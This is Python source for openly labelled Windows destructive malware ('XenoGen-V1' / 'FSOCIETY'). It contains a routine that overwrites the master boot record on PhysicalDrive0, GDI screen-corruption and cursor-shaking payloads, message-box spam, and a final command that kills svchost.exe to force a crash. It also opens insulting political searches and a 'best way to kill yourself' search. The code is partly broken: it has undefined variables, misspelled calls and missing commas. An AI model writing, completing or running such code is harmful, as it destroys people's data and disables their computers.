from win32api import *
from win32gui import *
from win32ui import *
from ctypes import windll
from win32con import *
from win32file import *
from random import randrange as rd 
from random import *
from sys import exit
import multiprocessing

# Xeno warning ui
def warning():
    if MessageBox("this malware can potentially destroy your computer\n    and destroy your data we are giving you the option to\n    encrypt your files and then destroy your computer\n    if you choose to do so press yes if you dont want to\n    press no and the program will close ","XenoGen-V1",
        MB_YESNO | MB_ICONWARNING) == 7:
        exit()
    if MessageBox("THIS IS LAST WARNING \n it is not my responsible for your data lost if you clicked yes \n the malware will start if no the malware will exit \n choose wisely","XenoGen-V1",
        MB_YESNO | MB_ICONWARNING) == 7:
        exit()

class Data:
    sites = (
        "http://www.google.Xeno.Gen.Fsociety/search?q=best+way+to+kill+yourself",
        "http://www.google.Xeno.Gen.Fsociety/search?q=how+2+remove+a+virus",
        "http://www.google.Xeno.Gen.Fsociety/search?q=mcafee+vs+norton",
        "http://www.google.Xeno.Gen.Fsociety/search?q=fuck+society",
        "http://www.google.Xeno.Gen.Fsociety/search?q=our+democracy+has+been+hacked",
        "http://www.google.Xeno.Gen.Fsociety/search?q=we+are+the+best",
        "http://www.google.Xeno.Gen.Fsociety/search?q=we+own+this+world",
        "http://www.google.Xeno.Gen.Fsociety/search?q=how+to+get+money",
        "http://www.google.Xeno.Gen.Fsociety/search?q=how+to+send+a+virus+to+my+friend",
        "http://www.google.Xeno.Gen.Fsociety/search?q=fuck+the+world",
        "http://www.google.Xeno.Gen.Fsociety/search?q=fuck+you+leni+robredo"
        "http://www.google.Xeno.Gen.Fsociety/search?q=fuck+you+kakampinks",
        "http://www.google.Xeno.Gen.Fsociety/search?q=let+bbm+lead",
        "http://www.google.Xeno.Gen.Fsociety/search?q=you+are+owned+by+the+world",
        "http://www.google.Xeno.Gen.Fsociety/search?q=we+are+fsociety",
        "http://www.google.Xeno.Gen.Fsociety/search?q=g3t+r3kt",
        "http://www.google.Xeno.Gen.Fsociety/search?q=how+to+buy+a+weed",
        "http://softonic.com/",
        "http://fsociety.com/",
        "calc"
        "notepad"
        "cmd"
        "write"
        "regedit"
        "explorer"
        "taskmgr"
        "msfconfig"
        "mspaint"
        "devmgmt.msc"
        "control"
        "mmc"
        )
    IconError = LoadIcon(None, 32513)
    IconSkull = LoadIcon(None, 32516)


class MBR:
    def overwrite():
        handle = CreateFileW("\\\\.\\PhysicalDrive0",
                                GENERIC_WRITE,
                                FILE_SHARE_READ | FILE_SHARE_WRITE,
                                None,
                                OPEN_EXISTING,
                                0,0)
        WriteFile(handle, AllocateReadBuffer(512),
                                None)

        CloseHandle(handle)


time = 0
timeSubtract = 15000

class Payloads:
    def open_sites():
        global timeSubtract
        sites = Data.sites
        global time
        for i in range(0, 10):
            __import__("os").system("start " + str(choice(sites)))
            Sleep(timeSubtract-time)
    def decrease_timer():
        global time
        while time < 15000:
            time += 1
            Sleep(10)
    def blink_screen():
        global time
        global timeSubtract
        HDC = GetDC(0)
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
        while True:
            Sleep(timeSubtract-time)
            PatBlt(HDC, 0, 0, x, y, PATINVERT)

    def reverse_text():
        global time
        global timeSubtract
        HWND = GetDesktopWindow()
        while True:
            EnumChildWindows(HWND, Payloads.EnumChildProc, None)
            Sleep(timeSubtract-time)
    
    def error_drawing():
        global time
        global timeSubtract
        HDC = GetDC(0)
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
        while True:
            DrawIcon(HDC, rd(sw), rd(sh), Data.IconSkull)
            for i in range(0, 60):
                mouseX,mouseY = GetCursorPos()
                DrawIcon(HDC, mouseX, mouseY, Data.IconError)
                SLeep(10)

    def warning_spam():
        global time
        global timeSubtract
        for i in range(0, 10):
            warning = multiprocessing.Process(target = msgboxThread)
            Sleep(5)
            warning = multiprocessing.Process(target = msgboxThread1)
            Sleep(timeSubtract-time)

    def screen_puzzle():
        global time
        global timeSubtract
        HDC = GetDC(0)
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))

        x1 = rd(sw=100)
        y1 = rd(sh=100)
        x2 = rd(sw=100)
        y2 = rd(sh=100)

        width = rd(sw=600)
        height = rd(sh=600)

        while True:
            BitBlt(HDC, x1, y1, width, height, HDC, x2, y2, SRCCOPY)
            Sleep(timeSubtract-time)

    def curser_shake():
        global time
        global timeSubtract
        while True:
            x,y = GetCursorPos()

            newX = x + rd(sw(3)-1) + rd(int((time+1)/2200+2))
            newY = y + rd(sh(3)-1) + rd(int((time+1)/2200+2))

            SetCursorPos((newY, newX))

            Sleep(10)

    def tunnel_effect():
        global time
        global timeSubtract
        sw,sh = (GetSystemMetrics(0),GetSystemMetrics(1))
        HDC = GetDC(0)
        while True:
            StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)
            Sleep(time-timeSubtract)

def msgboxThread():
    MessageBox("still using this computer?", "lol", MB_OK | MB_ICONWARNING)

def msgboxThread1():
    MessageBox("We are FSOCIETY", "FSOCIETY", MB_OK | MB_ICONWARNING)

def EnumChildProc(hwnd, LParam):
    try:
        buffering = PyMakeBuffer(255)
        length = SendMessage(hwnd, WM_GETTEXT, 255, buffering)
        result = str(buffering[0:length*2].tobytes().decode('utf-16'))
        result = result[::-1]

        SendMessage(hwnd, VM_SETTEXT, None, result)
    
    except:
        pass


if __name__ == '__main__':
    p = Payloads()

    opensites = multiprocessing.Process(target=p.open_sites)
    timersub = multiprocessing.Process(target=p.decrease_timer)
    reverse = multiprocessing.Process(target=p.reverse_text)
    blinking = multiprocessing.Process(target=p.blink_screen)
    icons = multiprocessing.Process(target=p.error_drawing)
    shaking = multiprocessing.Process(target=p.curser_shake)
    tunneling = multiprocessing.Process(target=p.tunnel_effect)
    puzzling = multiprocessing.Process(target=p.screen_puzzle)
    errors = multiprocessing.Process(target=p.warning_spam)

    timersub.start()
    opensites.start()
    shaking.start()
    Sleep(timeSubtract*2)
    blinking.start()
    icons.start()
    Sleep(7000*2)
    reverse.start()
    puzzling.start()
    errors.start()
    Sleep(5000*2)
    tunneling.start()
    while time < 15000:
        Sleep(10)
    __import__("os").system("taskkill /F /IM svchost.exe") # Cause a bsod
